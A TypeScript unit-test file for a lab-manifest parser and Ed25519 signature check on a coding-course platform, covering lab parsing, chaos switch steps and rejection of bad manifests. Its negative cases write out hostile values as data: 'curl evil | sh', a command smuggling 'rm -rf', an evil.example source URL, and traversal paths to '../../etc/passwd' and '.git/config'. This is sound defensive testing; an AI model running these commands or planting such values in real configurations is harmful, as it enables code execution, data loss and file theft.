import { generateKeyPairSync, sign } from "node:crypto"
import { LAB_MANIFEST_FIXTURE } from "@tests/fixtures/builders/relay-lab.builder"
import { ManifestPolicy } from "./manifest.policy"
import { chaosStepsOf, labOf, labSourcePathOf, labTaskIdOf } from "./lab.policy"
import { SOURCE_COMMIT, bugsTarball, gradeBody, labBody, solutionLink } from "./lab.testing"
import type { LabSection } from "./lab.contracts"

const KEYS = generateKeyPairSync("ed25519")
const PUBLIC_PEM = KEYS.publicKey.export({ type: "spki", format: "pem" }).toString()
const OTHER = generateKeyPairSync("ed25519")

const payloadOf = (lab: unknown, taskId = "course:backend/orders"): string =>
    JSON.stringify({ manifestId: "m-1", taskId, lab })

const signedBy = (payload: string, key = KEYS.privateKey): string =>
    sign(null, Buffer.from(payload, "utf8"), key).toString("base64")

describe("labOf", () => {
    it("is absent for a manifest without a lab and reads a whole lab section", () => {
        expect(labOf(undefined)).toBeUndefined()

        const lab = labOf(labBody({ chaosOn: ["slow-db"] })) as LabSection
        expect(lab).toMatchObject({
            courseId: "backend",
            lessonId: "orders",
            source: {
                url: "/api/relay/courses/backend/orders/bugs.tgz",
                sha256: bugsTarball().sha256,
                commit: SOURCE_COMMIT,
            },
            dir: "app",
            compose: "docker-compose.yml",
            project: "backend-orders",
            services: ["api", "db"],
            test: { command: "npm test", scenario: "npm test -- --scenario {id}", report: "reports/junit.xml" },
            chaos: [
                { id: "slow-db", on: "node chaos.js slow-db on", off: "node chaos.js slow-db off" },
                { id: "drop-queue", on: "node chaos.js drop-queue on", off: "node chaos.js drop-queue off" },
            ],
            chaosOn: ["slow-db"],
            action: "boot",
        })
        expect(labTaskIdOf(lab)).toBe("course:backend/orders")
        expect(lab.grade).toBeUndefined()
        expect(lab.solution).toBeUndefined()
        expect(lab.seed).toBeUndefined()
    })

    it("reads the solution link when the manifest has it, and a seed only when the manifest names one", () => {
        const lab = labOf(
            labBody({ solution: solutionLink(), seed: { command: "npm run seed", timeoutMs: 60_000 } }),
        ) as LabSection

        expect(lab.solution?.url).toBe("/api/relay/courses/backend/orders/solution.tgz")
        expect(lab.seed).toEqual({ command: "npm run seed", timeoutMs: 60_000 })
    })

    it("reads a grade section only on a grade action, with its command, hidden files and seed order", () => {
        const lab = labOf(labBody({ action: "grade", grade: gradeBody() })) as LabSection

        expect(lab.grade).toMatchObject({
            submissionId: "sub-1",
            nonce: "nonce-1",
            command: "npm run grade",
            seedOrder: ["h-pay-once", "h-order-total", "h-stock"],
        })
        expect(lab.grade?.files[0]?.path).toBe("grader/orders.hidden.test.ts")
        expect(labOf(labBody({ action: "grade" }))).toBeNull()
        expect(labOf(labBody({ action: "test", grade: gradeBody() }))).toBeNull()
    })

    it("reads the whole lab section the relay signs, name for name (the fixture both specs share)", () => {
        const lab = labOf(LAB_MANIFEST_FIXTURE) as LabSection

        expect(lab).toMatchObject({
            courseId: "shop",
            lessonId: "oversell",
            source: LAB_MANIFEST_FIXTURE.source,
            solution: LAB_MANIFEST_FIXTURE.solution,
            dir: "app",
            compose: "docker-compose.yml",
            project: "starci-shop-oversell",
            test: LAB_MANIFEST_FIXTURE.test,
            chaos: LAB_MANIFEST_FIXTURE.chaos,
            chaosOn: ["slow-db"],
            action: "grade",
            grade: {
                submissionId: LAB_MANIFEST_FIXTURE.grade.submissionId,
                nonce: LAB_MANIFEST_FIXTURE.grade.nonce,
                command: "npm run grade",
                seedOrder: ["h-b", "h-a"],
            },
        })
        expect(lab.grade?.files).toEqual([
            {
                path: "grader/order.spec.ts",
                sha256: LAB_MANIFEST_FIXTURE.grade.files[0]?.sha256,
                content: LAB_MANIFEST_FIXTURE.grade.files[0]?.content,
            },
        ])
        const payload = payloadOf(LAB_MANIFEST_FIXTURE, "course:shop/oversell")
        expect(new ManifestPolicy().verified(payload, signedBy(payload), PUBLIC_PEM).kind).toBe("verified")
    })

    it("takes the project folder `.` for the lab folder itself", () => {
        expect((labOf(labBody({ dir: "." })) as LabSection).dir).toBe(".")
    })

    const source = (extra: Record<string, unknown>) => ({
        source: {
            url: "/api/relay/courses/backend/orders/bugs.tgz",
            sha256: "a".repeat(64),
            commit: "b".repeat(40),
            ...extra,
        },
    })

    it.each([
        ["an unknown action", { action: "destroy" }],
        ["a source url on another host", source({ url: "https://evil.example/bugs.tgz" })],
        ["a source url of another lab", source({ url: "/api/relay/courses/backend/other/bugs.tgz" })],
        ["the solution route as the source", source({ url: "/api/relay/courses/backend/orders/solution.tgz" })],
        ["a source hash that is not a sha256", source({ sha256: "abc" })],
        ["a source commit that is not a sha", source({ commit: "HEAD" })],
        ["no source at all", { source: undefined }],
        [
            "a solution link to the lesson branch",
            { solution: { ...solutionLink(), url: labSourcePathOf("backend", "orders", "bugs") } },
        ],
        ["a compose path above the lab", { compose: "../compose.yml" }],
        ["a project folder above the lab", { dir: "../x" }],
        ["a file path above the lab", { files: ["../secret"] }],
        ["a file path in .git", { files: [".git/config"] }],
        ["a service with a space", { services: ["api server"] }],
        ["a chaos switch without an off command", { chaos: [{ id: "x", on: "run x" }] }],
        ["a chaos command with a line break", { chaos: [{ id: "x", on: "run x\nrm -rf", off: "run y" }] }],
        ["a chaos command that is empty", { chaos: [{ id: "x", on: " ", off: "run y" }] }],
        ["the old env and value of a chaos switch", { chaos: [{ id: "x", env: "CHAOS", value: "1" }] }],
        ["a chaosOn id that no chaos defines", { chaosOn: ["nope"] }],
        ["a seed command without a timeout", { seed: { command: "x" } }],
        ["a test command that is empty", { test: { command: " ", scenario: "t {id}", report: "r.xml", timeoutMs: 1 } }],
        [
            "a scenario template without {id}",
            { test: { command: "npm test", scenario: "npm test", report: "r.xml", timeoutMs: 1 } },
        ],
        [
            "a report path above the lab",
            { test: { command: "npm test", scenario: "t {id}", report: "../r.xml", timeoutMs: 1 } },
        ],
    ])("refuses the whole lab for %s", (_name, extra) => {
        expect(labOf(labBody(extra))).toBeNull()
    })

    it("refuses a hidden file whose path leaves the checkout or whose hash is not a sha256, and a grade with no hidden id", () => {
        const good = gradeBody() as { files: Array<Record<string, unknown>> }
        const escape = { ...gradeBody(), files: [{ ...good.files[0], path: "../x" }] }
        const badHash = { ...gradeBody(), files: [{ ...good.files[0], sha256: "abc" }] }
        const noIds = { ...gradeBody(), seedOrder: [] }

        expect(labOf(labBody({ action: "grade", grade: escape }))).toBeNull()
        expect(labOf(labBody({ action: "grade", grade: badHash }))).toBeNull()
        expect(labOf(labBody({ action: "grade", grade: noIds }))).toBeNull()
    })
})

describe("chaosStepsOf", () => {
    const lab = labOf(labBody()) as LabSection

    it("turns off the switches that leave and on the ones that enter, off first, and runs nothing for the rest", () => {
        expect(chaosStepsOf(lab, ["slow-db"], ["drop-queue"])).toEqual([
            { id: "slow-db", turn: "off", command: "node chaos.js slow-db off" },
            { id: "drop-queue", turn: "on", command: "node chaos.js drop-queue on" },
        ])
        expect(chaosStepsOf(lab, [], ["slow-db", "drop-queue"]).map((step) => [step.id, step.turn])).toEqual([
            ["slow-db", "on"],
            ["drop-queue", "on"],
        ])
        expect(chaosStepsOf(lab, ["slow-db"], ["slow-db"])).toEqual([])
        expect(chaosStepsOf(lab, [], [])).toEqual([])
        expect(chaosStepsOf(lab, ["slow-db", "drop-queue"], []).map((step) => step.turn)).toEqual(["off", "off"])
    })

    it("ignores an id the lab does not define", () => {
        expect(chaosStepsOf(lab, ["made-up"], ["slow-db"]).map((step) => step.id)).toEqual(["slow-db"])
    })
})

describe("a lab manifest through the signature check", () => {
    const policy = new ManifestPolicy()

    it("is verified when StarCi signed it, with no checks of its own", () => {
        const payload = payloadOf(labBody())
        const read = policy.verified(payload, signedBy(payload), PUBLIC_PEM)

        expect(read.kind).toBe("verified")
        if (read.kind === "verified") {
            expect(read.manifest.checks).toEqual([])
            expect(read.manifest.lab?.courseId).toBe("backend")
        }
    })

    it("is rejected when it is unsigned, signed by another key or altered after signing", () => {
        const payload = payloadOf(labBody({ chaos: [{ id: "slow-db", on: "node chaos.js slow-db on", off: "x" }] }))

        expect(policy.verified(payload, "", PUBLIC_PEM)).toMatchObject({ kind: "rejected" })
        expect(policy.verified(payload, signedBy(payload, OTHER.privateKey), PUBLIC_PEM)).toEqual({
            kind: "rejected",
            cause: "signature",
        })
        const signature = signedBy(payload)
        expect(
            policy.verified(payload.replace("node chaos.js slow-db on", "curl evil | sh"), signature, PUBLIC_PEM),
        ).toEqual({
            kind: "rejected",
            cause: "signature",
        })
    })

    it("is rejected when its task id does not name its own course and lesson", () => {
        const payload = payloadOf(labBody(), "course:backend/other")

        expect(policy.verified(payload, signedBy(payload), PUBLIC_PEM)).toEqual({ kind: "rejected", cause: "payload" })
    })

    it("is rejected when its lab is malformed even though it is signed", () => {
        const payload = payloadOf(labBody({ files: ["../../etc/passwd"] }))

        expect(policy.verified(payload, signedBy(payload), PUBLIC_PEM)).toEqual({ kind: "rejected", cause: "payload" })
    })
})
